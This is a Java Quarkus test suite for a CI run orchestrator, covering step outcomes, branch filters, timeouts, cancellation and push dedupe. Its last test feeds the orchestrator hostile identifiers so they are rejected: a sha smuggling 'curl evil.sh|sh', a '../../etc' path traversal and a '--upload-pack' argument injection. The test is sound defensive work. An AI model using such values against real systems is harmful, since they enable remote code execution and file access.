package eu.wohlben.qits.ci.control;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.ci.control.CiConfigSource.ConfigLookup;
import eu.wohlben.qits.ci.control.CiStepRunner.StepOutcome;
import eu.wohlben.qits.ci.control.CiStepRunner.StepResult;
import eu.wohlben.qits.ci.entity.CiRun;
import eu.wohlben.qits.ci.entity.CiRunStatus;
import eu.wohlben.qits.ci.entity.CiStep;
import eu.wohlben.qits.ci.entity.CiStepStatus;
import eu.wohlben.qits.ci.entity.CiTriggerType;
import eu.wohlben.qits.ci.error.BadRequestException;
import eu.wohlben.qits.ci.error.ConflictException;
import eu.wohlben.qits.ci.error.NotFoundException;
import io.quarkus.narayana.jta.QuarkusTransaction;
import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import java.time.Instant;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import org.junit.jupiter.api.Test;

/**
 * Drives the orchestrator synchronously (package-private {@code execute}) against the fake config
 * source and the scripted-event step runner — the whole run/step state machine with no docker, no
 * container and no git host.
 */
@QuarkusTest
public class CiRunServiceTest extends CiTestSupport {

  private static final String CONFIG_TWO_STEPS =
      """
      steps:
        - image: alpine:3
          script: echo one
        - image: alpine:3
          script: echo two
      """;

  @Inject CiRunService service;

  /** The green-run port, for the one case that has to prove an all-skipped run is really green. */
  @Inject FakeRunAnnouncer announcer;

  private String repoId;
  private String sha;

  @org.junit.jupiter.api.BeforeEach
  void resetPorts() {
    announcer.reset();
  }

  private void seedConfig(String content) {
    repoId = UUID.randomUUID().toString();
    sha = UUID.randomUUID().toString().replace("-", "");
    fakeConfig.put(repoId, sha, ConfigLookup.found(content));
  }

  /**
   * One push announced, as {@code bus/ScmPublishCommitListener} announces it: a fresh event id per
   * call, because every push is its own {@code SCMPublishCommit} and two runs under one id are one
   * commit built twice.
   */
  private void announcePush(String repoId, String branch, String sha) {
    service.onPostReceive(
        CiRepoRef.of(repoId), branch, "0".repeat(40), sha, UUID.randomUUID().toString());
  }

  private CiRun soleRun() {
    List<CiRun> all = service.runsFor(repoId);
    assertEquals(1, all.size(), "expected exactly one recorded run");
    return all.get(0);
  }

  @Test
  public void greenRunRecordsSuccessWithStepOutputs() {
    seedConfig(CONFIG_TWO_STEPS);
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals("main", run.branch);
    assertEquals(sha, run.commitSha);
    assertNotNull(run.finishedAt);
    // The run is pinned to one daemon build, resolved once before any step launched.
    assertEquals("fake-daemon", run.daemonVersion);

    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size());
    for (CiStep step : recorded) {
      assertEquals(CiStepStatus.SUCCESS, step.status);
      assertEquals(0, step.exitCode);
      assertEquals("ok step " + step.stepIndex, step.output);
      assertEquals("alpine:3", step.image);
      // Host-stamped at the two points the host knows about first-hand, and in that order.
      assertNotNull(step.startedAt, "a step that ran must carry a started_at");
      assertNotNull(step.finishedAt, "a step that ran must carry a finished_at");
      assertFalse(step.finishedAt.isBefore(step.startedAt));
    }
    // The runner saw the right specs, in order, each carrying the run's pinned binary url.
    assertEquals(2, fakeRunner.executed().size());
    assertEquals("echo one", fakeRunner.executed().get(0).script());
    assertEquals(sha, fakeRunner.executed().get(0).sha());
    assertEquals("main", fakeRunner.executed().get(0).branch());
    assertEquals(
        "http://fake.invalid/ci-daemon/fake-daemon", fakeRunner.executed().get(0).daemonBinaryUrl());
    // Chunks reached the listener while the step ran — the seam's event half.
    assertEquals(List.of("ok step 0", "ok step 1"), fakeRunner.emitted());
    // And the run released whatever the runner was holding for it.
    assertEquals(List.of(run.id), fakeRunner.closed());
  }

  @Test
  public void failingStepFailsTheRunAndSkipsTheRest() {
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(7, false, StepOutcome.OK, "boom"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertEquals(7, recorded.get(0).exitCode);
    assertEquals("boom", recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertNull(recorded.get(1).exitCode);
    // A skipped step never started, so it carries neither timestamp.
    assertNull(recorded.get(1).startedAt);
    assertNull(recorded.get(1).finishedAt);
    // Only the failing step actually executed.
    assertEquals(1, fakeRunner.executed().size());
  }

  @Test
  public void timedOutStepEndsTheRunTimedOutWithAMarkedOutput() {
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(143, true, StepOutcome.OK, "partial output"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    // A deadline is not a pipeline verdict, so neither the step nor the run is FAILED.
    assertEquals(CiRunStatus.TIMED_OUT, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    CiStep first = recorded.get(0);
    assertEquals(CiStepStatus.TIMED_OUT, first.status);
    // Recorded as a timeout, not as a script that happened to exit 143.
    assertTrue(first.output.contains("[step timed out]"), first.output);
    assertTrue(first.output.contains("partial output"), first.output);
    assertEquals(143, first.exitCode);
    // And it stops the run exactly as a failure does.
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertEquals(1, fakeRunner.executed().size());
  }

  @Test
  public void aCancelledStepThatAlsoTimedOutIsRecordedCancelled() throws Exception {
    // Both flags can be true: the host aborts a cancelled container the same way it aborts one that
    // ran out of time, so the terminal frame can carry timedOut. A cancellation is a user decision,
    // so it wins over the clock — neither the step nor the run may read TIMED_OUT. Staged like the
    // cancellation test above, because that is the only way the flag is really set.
    seedConfig(CONFIG_TWO_STEPS);
    CompletableFuture<String> reachedStepZero = new CompletableFuture<>();
    CountDownLatch cancelled = new CountDownLatch(1);
    fakeRunner.during(
        0,
        spec -> {
          reachedStepZero.complete(spec.runId());
          try {
            cancelled.await(10, TimeUnit.SECONDS);
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
          }
        });
    fakeRunner.script(0, new StepResult(143, true, StepOutcome.OK, "half a line"));

    announcePush(repoId, "main", sha);
    String runId = reachedStepZero.get(10, TimeUnit.SECONDS);
    service.cancel(runId);
    cancelled.countDown();
    service.awaitIdle();

    forgetLoadedEntities();
    CiRun run = soleRun();
    assertEquals(CiRunStatus.CANCELLED, run.status);
    CiStep first = service.stepsFor(run.id).get(0);
    assertEquals(CiStepStatus.FAILED, first.status);
    assertTrue(first.output.contains("cancelled"), first.output);
  }

  @Test
  public void aDeclaredPerStepTimeoutOverridesTheDeploymentDefault() {
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: echo quick
            timeout-seconds: 30
          - image: alpine:3
            script: echo slow
        """);
    service.execute(repoId, "main", sha);

    assertEquals(30, fakeRunner.executed().get(0).timeoutSeconds());
    // An absent field means the shipped default: 30 minutes.
    assertEquals(1800, fakeRunner.executed().get(1).timeoutSeconds());
  }

  @Test
  public void aDeclaredDockerFlagTravelsFromTheYamlToTheStepItWasDeclaredOn() {
    // The seam-level half of the docker-socket feature: everything from the parsed key to the argv is
    // covered elsewhere, and what this asserts is the wiring in between — that the flag arrives at the
    // runner attached to the step that declared it and to no other. The mount itself is
    // CiDaemonLauncherTest's subject; that a step which declared nothing keeps its sandbox is asserted
    // there as an absence, and here as a plain false.
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: ./mvnw -B -ntp verify
          - image: alpine:3
            docker: true
            script: |
              docker build -t "$QITS_REGISTRY/$QITS_IMAGE_REPOSITORY/app:$QITS_CI_SHA" .
              docker push "$QITS_REGISTRY/$QITS_IMAGE_REPOSITORY/app:$QITS_CI_SHA"
        """);
    service.execute(repoId, "main", sha);

    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
    assertEquals(2, fakeRunner.executed().size());
    assertFalse(fakeRunner.executed().get(0).docker(), "a step declaring nothing asks for no socket");
    assertTrue(fakeRunner.executed().get(1).docker(), "the publish step's declaration must arrive");
    // And a publish step is an ordinary step in every other respect — same image handling, same
    // recorded row, same deployment-default deadline unless it said otherwise.
    assertEquals(1800, fakeRunner.executed().get(1).timeoutSeconds());
    assertEquals(CiStepStatus.SUCCESS, service.stepsFor(soleRun().id).get(1).status);
  }

  // --- the per-step branch filter ---

  private static final String CONFIG_MAINTENANCE_LEG =
      """
      steps:
        - image: node-base:latest
          script: npm test
        - image: node-base:latest
          branches:
            - prefix: maintenance/
          script: ./release.sh
      """;

  @Test
  public void aStepTheBranchDoesNotBindIsSkippedWithANoteAndTheRunStaysGreen() {
    seedConfig(CONFIG_MAINTENANCE_LEG);
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status, "an unbound step is a non-event to the verdict");
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size(), "the step is recorded, not passed over");
    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertEquals("[step not bound to branch main]", recorded.get(1).output);
    assertNull(recorded.get(1).exitCode);
    // Nothing started, so it carries neither timestamp — and no container was ever launched.
    assertNull(recorded.get(1).startedAt);
    assertNull(recorded.get(1).finishedAt);
    assertEquals(1, fakeRunner.executed().size());
  }

  @Test
  public void aBoundStepRunsOnTheBranchThatBindsIt() {
    seedConfig(CONFIG_MAINTENANCE_LEG);
    service.execute(repoId, "maintenance/qits-spa-ui-components", sha);

    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
    List<CiStep> recorded = service.stepsFor(soleRun().id);
    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status);
    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status);
    assertEquals(2, fakeRunner.executed().size());
    assertEquals("./release.sh", fakeRunner.executed().get(1).script());
  }

  @Test
  public void anUnboundStepBlocksNothingAfterIt() {
    // The half a green run cannot show: `failed` is untouched, so the loop continues — asserted by
    // the step AFTER the unbound one actually executing.
    seedConfig(
        """
        steps:
          - image: alpine:3
            branches:
              - prefix: maintenance/
            script: ./release.sh
          - image: alpine:3
            script: echo after
        """);
    service.execute(repoId, "main", sha);

    List<CiStep> recorded = service.stepsFor(soleRun().id);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(0).status);
    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status);
    assertEquals(1, fakeRunner.executed().size());
    assertEquals("echo after", fakeRunner.executed().get(0).script());
  }

  @Test
  public void theTwoKindsOfSkippedAreDistinguishableByTheirOutput() {
    // The whole of how they stay apart: a never-reached step keeps its null output, a branch-skipped
    // one carries the bracketed note. No new status, no new column, no migration.
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: npm test
          - image: alpine:3
            branches:
              - prefix: maintenance/
            script: ./release.sh
          - image: alpine:3
            script: echo never
        """);
    fakeRunner.script(0, new StepResult(1, false, StepOutcome.OK, "tests failed"));
    service.execute(repoId, "main", sha);

    assertEquals(CiRunStatus.FAILED, soleRun().status);
    List<CiStep> recorded = service.stepsFor(soleRun().id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    // Both of the following are SKIPPED, and both were skipped for different reasons.
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertNull(recorded.get(1).output, "a step the loop never reached says nothing");
    assertEquals(CiStepStatus.SKIPPED, recorded.get(2).status);
    assertNull(recorded.get(2).output);
  }

  @Test
  public void aRunWithAnUnscopedABoundAndAnUnboundStepRecordsAllThreeReadably() {
    // The boundary case, read off the rows the way a person would: three declared steps, three
    // outcomes, one run, and the reason for each is in the row itself.
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: npm test
          - image: alpine:3
            branches:
              - prefix: maintenance/
            script: ./release.sh
          - image: alpine:3
            branches:
              - exact: main
            script: ./deploy.sh
        """);
    service.execute(repoId, "maintenance/qits-spa-angular", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(3, recorded.size());
    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status, "the unscoped step ran");
    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status, "the bound step ran");
    assertEquals(CiStepStatus.SKIPPED, recorded.get(2).status, "the unbound step did not");
    assertEquals("[step not bound to branch maintenance/qits-spa-angular]", recorded.get(2).output);
    assertEquals(2, fakeRunner.executed().size());
  }

  @Test
  public void aRunWhoseEveryStepIsBranchSkippedFinishesGreenAndAnnounces() {
    // The empty-pipeline precedent rather than a new rule — and asserted rather than assumed,
    // because "trivially green" has to mean the same green: it announces the deploy and it publishes.
    seedConfig(
        """
        steps:
          - image: alpine:3
            branches:
              - prefix: maintenance/
            script: ./release.sh
          - image: alpine:3
            branches:
              - exact: release
            script: ./ship.sh
        """);
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals(0, fakeRunner.executed().size(), "no container was launched");
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size());
    for (CiStep step : recorded) {
      assertEquals(CiStepStatus.SKIPPED, step.status);
      assertEquals("[step not bound to branch main]", step.output);
    }
    assertEquals(1, announcer.announced().size(), "a green run announces, however little it did");
    assertEquals(run.id, announcer.announced().get(0).runId());
  }

  @Test
  public void brokenConfigRecordsAConfigErrorRunWithNoSteps() {
    seedConfig("steps:\n  - image: alpine:3\n"); // missing script
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.CONFIG_ERROR, run.status);
    assertNotNull(run.finishedAt);
    // Nothing was ever launched, so the run pins no daemon.
    assertNull(run.daemonVersion);
    assertEquals(0, service.stepsFor(run.id).size());
    assertEquals(0, fakeRunner.executed().size());
  }

  @Test
  public void absentConfigRecordsNothing() {
    repoId = UUID.randomUUID().toString();
    service.execute(repoId, "main", "0123456789abcdef");
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void unreachableGitHostRecordsNothing() {
    // The retry schedule is empty here (CiTestSupport), so the first unreachable answer decides.
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void anUnreachableGitHostIsRetriedAndTheRunSurvivesTheBounce() {
    // The 2026-08-13 loss: the deploy train bounced the git host, the very next push's config read
    // failed once, and the discarded row cost the whole deploy — the announcing event was already
    // consumed. Patience is the fix, so two failures followed by an answer must build green.
    service.unreachableRetryDelays(List.of(java.time.Duration.ZERO, java.time.Duration.ZERO));
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
    fakeConfig.put(repoId, sha, ConfigLookup.found(CONFIG_TWO_STEPS));

    service.execute(repoId, "main", sha);

    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
    assertEquals(3, fakeConfig.configReads().stream().filter((repoId + "@" + sha)::equals).count());
  }

  @Test
  public void aGitHostStillUnreachableAfterThePatienceRecordsNothing() {
    // The schedule ran out and every read failed: the old decision stands, just later.
    service.unreachableRetryDelays(List.of(java.time.Duration.ZERO));
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());

    service.execute(repoId, "main", sha);

    assertEquals(0, service.runsFor(repoId).size());
    assertEquals(2, fakeConfig.configReads().stream().filter((repoId + "@" + sha)::equals).count());
  }

  @Test
  public void presentConfigWithNoStepsRecordsATriviallyGreenRun() {
    // Opted in (file present) but nothing to verify — visible, unlike an absent file.
    seedConfig("# no steps yet\n");
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals(0, service.stepsFor(run.id).size());
  }

  @Test
  public void commitGoneBeforeTheRunRecordsNothing() {
    // Force-pushed away between push and run: nothing is recorded, so a commit whose build was
    // never broken is never shown red.
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.gone());
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void unusableConfigRecordsAConfigErrorRun() {
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.invalid("too large"));
    service.execute(repoId, "main", sha);
    assertEquals(CiRunStatus.CONFIG_ERROR, soleRun().status);
  }

  @Test
  public void aShaGoneCheckoutDiscardsTheRunWhenTheCommitIsIndeedGone() {
    // The daemon's checkout is the probe now: it reports SHA_GONE, and the config re-read confirms
    // the commit was force-pushed away mid-queue. The run describes a push that no longer exists.
    seedConfig(CONFIG_TWO_STEPS);
    fakeConfig.put(repoId, sha, ConfigLookup.gone()); // what the post-failure re-read sees
    fakeRunner.script(
        0,
        new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: reference is not a tree: deadbeef"));
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void aShaGoneCheckoutOnAReachableCommitStaysOnTheRecord() {
    // Same frame, different truth: the commit is still there, so something else broke the checkout
    // and the user must see it. Discarding here would hide a broken pipeline.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(
        0, new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: could not read from remote"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("could not read from remote"));
    assertTrue(recorded.get(0).output.contains("could not check out"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
  }

  @Test
  public void anInitFailureWithNoReasonIsRecordedGenericallyAndNeverDiscardsTheRun() {
    // A hostile daemon can send InitFailed with an absent reason — the codec decodes that to null
    // rather than throwing, deliberately. It has to land as a generic setup failure and must NOT
    // fall through the SHA_GONE branch, which would let a container delete the run watching it.
    seedConfig(CONFIG_TWO_STEPS);
    fakeConfig.put(repoId, sha, ConfigLookup.gone()); // the re-read would say "discard" if reached
    fakeRunner.script(0, new StepResult(-1, false, StepOutcome.INIT_FAILED, "(no reason given)"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    CiStep first = service.stepsFor(run.id).get(0);
    assertEquals(CiStepStatus.FAILED, first.status);
    assertTrue(first.output.contains("could not prepare its workspace"), first.output);
  }

  @Test
  public void eachDistinguishableFailureStateIsRecordedAsItself() {
    // The transferred failure-state rule: docker refusing the launch, a container that never started
    // a daemon, one that registered and never finished a checkout, and a socket lost mid-step are
    // four different things, and none of them is "the step failed with exit -1".
    for (StepOutcome outcome :
        List.of(
            StepOutcome.LAUNCH_FAILED,
            StepOutcome.NEVER_STARTED,
            StepOutcome.NEVER_INITIALIZED,
            StepOutcome.CONNECTION_LOST)) {
      resetCiState();
      seedConfig(CONFIG_TWO_STEPS);
      fakeRunner.script(0, new StepResult(-1, false, outcome, "diagnosis for " + outcome));
      service.execute(repoId, "main", sha);

      CiStep first = service.stepsFor(soleRun().id).get(0);
      assertEquals(CiStepStatus.FAILED, first.status, outcome.name());
      assertTrue(first.output.contains("diagnosis for " + outcome), first.output);
      assertEquals(
          expectedNote(outcome),
          first.output.substring(first.output.lastIndexOf('[')),
          "each state must record a message that is only its own");
    }
  }

  private static String expectedNote(StepOutcome outcome) {
    return switch (outcome) {
      case LAUNCH_FAILED -> "[the step container could not be started]";
      case NEVER_STARTED -> "[the step container never started its ci daemon]";
      case NEVER_INITIALIZED -> "[the step container never reported its checkout done]";
      case CONNECTION_LOST -> "[the connection to the step container was lost]";
      default -> throw new IllegalArgumentException(outcome.name());
    };
  }

  @Test
  public void aFailureMidRunRecordsTheStepItHappenedOnAndSkipsTheRest() {
    // A crash inside the runner must not make a declared step vanish from the run: nothing is
    // written upfront any more, so the exception path is what has to write those rows.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.throwOn(0, new IllegalStateException("transient failure"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    assertNotNull(run.finishedAt);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size(), "every declared step must still have a row");
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("transient failure"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
  }

  @Test
  public void aCancellationMidStepCancelsTheRunFailsThatStepAndSkipsTheRest() throws Exception {
    // Staged the way it really happens: the run is on the worker, step 0 is executing, and the
    // cancellation arrives from another thread — the HTTP one. The fake holds step 0 open until the
    // POST has landed, so there is no sleep and no race about when "mid-step" is.
    //
    // Note the step still FINISHES normally afterwards — a daemon answers a Cancel with a terminal
    // frame — so cancelledness has to be read from the flag, never inferred from how run() returned.
    seedConfig(CONFIG_TWO_STEPS);
    CompletableFuture<String> reachedStepZero = new CompletableFuture<>();
    CountDownLatch cancelled = new CountDownLatch(1);
    fakeRunner.during(
        0,
        spec -> {
          reachedStepZero.complete(spec.runId());
          try {
            cancelled.await(10, TimeUnit.SECONDS);
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
          }
        });
    fakeRunner.script(0, new StepResult(137, false, StepOutcome.OK, "half a line"));

    announcePush(repoId, "main", sha);
    String runId = reachedStepZero.get(10, TimeUnit.SECONDS);
    service.cancel(runId);
    cancelled.countDown();
    service.awaitIdle();

    // The cancel above read the run into this thread's persistence context while it was still
    // RUNNING; without this the assertions below would read that copy back rather than the worker's.
    forgetLoadedEntities();
    CiRun run = soleRun();
    assertEquals(CiRunStatus.CANCELLED, run.status);
    assertNotNull(run.startedAt);
    assertEquals(CiRunService.USER_CANCELLED, run.cancellationReason);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("cancelled"), recorded.get(0).output);
    assertTrue(recorded.get(0).output.contains("half a line"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    // The runner was actually asked to stop the container, not just flagged.
    assertEquals(List.of(run.id), fakeRunner.cancelled());
    assertEquals(1, fakeRunner.executed().size(), "step 1 must never have been launched");
  }

  @Test
  public void aNewPushDedupesOlderQueuedPushesOnTheSameBranch() throws Exception {
    repoId = UUID.randomUUID().toString();
    String blockerSha = "1".repeat(40);
    String olderSha = "2".repeat(40);
    String newerSha = "3".repeat(40);
    String otherBranchSha = "4".repeat(40);
    fakeConfig.put(repoId, blockerSha, ConfigLookup.found(CONFIG_TWO_STEPS));
    fakeConfig.put(repoId, olderSha, ConfigLookup.found(CONFIG_TWO_STEPS));
    fakeConfig.put(repoId, newerSha, ConfigLookup.found(CONFIG_TWO_STEPS));
    fakeConfig.put(repoId, otherBranchSha, ConfigLookup.found(CONFIG_TWO_STEPS));

    CompletableFuture<Void> blockerStarted = new CompletableFuture<>();
    CountDownLatch releaseBlocker = new CountDownLatch(1);
    fakeRunner.during(
        0,
        spec -> {
          if (!spec.sha().equals(blockerSha)) {
            return;
          }
          blockerStarted.complete(null);
          try {
            releaseBlocker.await(10, TimeUnit.SECONDS);
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
          }
        });

    announcePush(repoId, "blocker", blockerSha);
    blockerStarted.get(10, TimeUnit.SECONDS);
    announcePush(repoId, "main", olderSha);
    announcePush(repoId, "feature", otherBranchSha);
    announcePush(repoId, "main", newerSha);
    releaseBlocker.countDown();
    service.awaitIdle();
    forgetLoadedEntities();

    List<CiRun> runs = service.runsFor(repoId);
    CiRun older = runs.stream().filter(run -> run.commitSha.equals(olderSha)).findFirst().orElseThrow();
    CiRun newer = runs.stream().filter(run -> run.commitSha.equals(newerSha)).findFirst().orElseThrow();
    CiRun otherBranch =
        runs.stream().filter(run -> run.commitSha.equals(otherBranchSha)).findFirst().orElseThrow();
    assertEquals(CiRunStatus.FAILED, older.status);
    assertEquals(CiRunService.DEDUPED, older.cancellationReason);
    assertEquals(newer.id, older.supersededByRunId);
    assertNull(older.daemonVersion, "a deduped queued build never starts");
    assertEquals(CiRunStatus.SUCCESS, newer.status);
    assertEquals(CiRunStatus.SUCCESS, otherBranch.status, "another branch is independent");
    assertEquals(0, service.stepsFor(older.id).size());
  }

  @Test
  public void manualCancellationPersistsTheOptionalReason() throws Exception {
    seedConfig(CONFIG_TWO_STEPS);
    CompletableFuture<String> reachedStep = new CompletableFuture<>();
    CountDownLatch cancelled = new CountDownLatch(1);
    fakeRunner.during(
        0,
        spec -> {
          reachedStep.complete(spec.runId());
          try {
            cancelled.await(10, TimeUnit.SECONDS);
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
          }
        });
    announcePush(repoId, "main", sha);
    String runId = reachedStep.get(10, TimeUnit.SECONDS);
    service.cancel(runId, "No longer needed");
    cancelled.countDown();
    service.awaitIdle();
    forgetLoadedEntities();

    assertEquals("No longer needed", soleRun().cancellationReason);
  }

  @Test
  public void cancellingARunningRunNoWorkerOwnsSettlesItCancelledAndFailsItsIncompleteSteps() {
    // What a dead predecessor leaves behind. On 2026-08-23 a start-first successor swept, and the
    // dying process then claimed a queued row and died holding it RUNNING — a row past every sweep,
    // executed by nobody. Cancel used to record a reason on it and ask a runner that owns nothing to
    // stop, so the row stayed RUNNING and had to be flipped by hand in SQL.
    seedConfig(CONFIG_TWO_STEPS);
    String runId = seedOrphanedRunningRun();

    service.cancel(runId, "the process that was running it is gone");

    forgetLoadedEntities();
    CiRun settled = soleRun();
    assertEquals(CiRunStatus.CANCELLED, settled.status);
    assertNotNull(settled.finishedAt, "an unowned run is finished here, not left for a worker");
    assertEquals("the process that was running it is gone", settled.cancellationReason);
    assertNull(settled.supersededByRunId);
    List<CiStep> recorded = service.stepsFor(runId);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status, "its in-flight step died with it");
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    // And nothing was asked to stop, because there is nothing here to ask.
    assertEquals(List.of(), fakeRunner.cancelled());
  }

  @Test
  public void cancellingAnUnownedRunTwiceIsAConflictTheSecondTime() {
    // The settle is terminal like every other cancellation, so it closes the row rather than leaving
    // a door a retry keeps walking through.
    seedConfig(CONFIG_TWO_STEPS);
    String runId = seedOrphanedRunningRun();

    service.cancel(runId);

    assertEquals(CiRunService.USER_CANCELLED, soleRun().cancellationReason);
    assertThrows(ConflictException.class, () -> service.cancel(runId));
  }

  /**
   * A {@code RUNNING} row with one running and one pending step, and no worker anywhere behind it —
   * exactly what a process killed mid-step leaves for its successor.
   */
  private String seedOrphanedRunningRun() {
    String runId = UUID.randomUUID().toString();
    QuarkusTransaction.requiringNew()
        .run(
            () -> {
              CiRun run = new CiRun();
              run.id = runId;
              run.repoId = repoId;
              run.branch = "main";
              run.commitSha = sha;
              run.status = CiRunStatus.RUNNING;
              run.triggerType = CiTriggerType.POST_RECEIVE;
              run.configPath = CiConfigParser.CONFIG_PATH;
              run.createdAt = Instant.now();
              run.startedAt = Instant.now();
              runs.persist(run);
              steps.persist(orphanedStep(runId, 0, CiStepStatus.RUNNING));
              steps.persist(orphanedStep(runId, 1, CiStepStatus.PENDING));
            });
    return runId;
  }

  private static CiStep orphanedStep(String runId, int index, CiStepStatus status) {
    CiStep step = new CiStep();
    step.id = UUID.randomUUID().toString();
    step.runId = runId;
    step.stepIndex = index;
    step.image = "alpine:3";
    step.status = status;
    return step;
  }

  @Test
  public void cancellingAFinishedRunIsAConflictAndAnUnknownRunIsANotFound() {
    seedConfig(CONFIG_TWO_STEPS);
    service.execute(repoId, "main", sha);
    String runId = soleRun().id;

    assertThrows(ConflictException.class, () -> service.cancel(runId));
    assertThrows(NotFoundException.class, () -> service.cancel("no-such-run"));
    // A refused cancellation must not have reached the runner at all.
    assertEquals(List.of(), fakeRunner.cancelled());
  }

  @Test
  public void hostileIdentifiersAreRejectedAtTheEntryPoint() {
    // A push says what somebody pushed, so the ids on it are validated before they reach a
    // filesystem path or an argv — whatever announced it.
    String good = UUID.randomUUID().toString();
    String event = UUID.randomUUID().toString();
    assertThrows(
        BadRequestException.class,
        () ->
            service.onPostReceive(
                CiRepoRef.of(good), "main", null, "HEAD\nset +e\ncurl evil.sh|sh #", event));
    assertThrows(
        BadRequestException.class,
        () ->
            service.onPostReceive(
                CiRepoRef.of("../../etc"), "main", null, "cafebabe0000000", event));
    assertThrows(
        BadRequestException.class,
        () ->
            service.onPostReceive(
                CiRepoRef.of(good), "--upload-pack=evil", null, "cafebabe0000000", event));
    // The name half is checked too — but ONLY when it is there, which is the whole compatibility
    // arm: an id-addressed push announces no pair and must still be accepted (every other case in
    // this method passes one with no names at all).
    assertThrows(
        BadRequestException.class,
        () ->
            service.onPostReceive(
                CiRepoRef.of(good, "../../etc", "qits-ci"), "main", null, "cafebabe0000000", event));
    assertThrows(
        BadRequestException.class,
        () ->
            service.onPostReceive(
                CiRepoRef.of(good, "qits", "../evil"), "main", null, "cafebabe0000000", event));
